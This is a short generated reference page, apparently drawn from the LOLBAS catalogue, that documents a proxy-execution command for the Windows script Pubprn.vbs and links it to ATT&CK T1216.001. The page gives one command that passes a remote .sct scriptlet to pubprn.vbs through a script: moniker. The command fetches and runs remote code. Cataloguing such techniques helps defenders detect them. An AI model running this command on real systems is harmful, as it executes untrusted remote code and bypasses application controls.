---
parsed_by: focuslocust
source: commands
type: generated
---
# Pubprn.vbs Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Pubprn.vbs

Tool page: [Pubprn.vbs](../../tools/windows/pubprn.vbs.md)

### Proxy execution

```text
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
```

Description:

Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection

Related ATT&CK:

- [T1216.001](../../attack/techniques/T1216.001-pubprn.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Pubprn.yml` |
| Evidence | Command preserved from source parser. |
